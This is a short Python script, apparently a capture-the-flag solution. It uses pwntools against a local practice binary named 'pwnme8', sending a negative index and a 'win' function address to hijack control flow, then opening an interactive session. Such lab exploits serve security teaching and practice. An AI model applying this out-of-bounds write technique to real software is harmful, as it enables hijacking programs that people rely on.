from pwn import *

p = process('./pwnme8')

win = 0x401196

p.sendline(b'-7')
p.sendline(str(win).encode())

p.interactive()
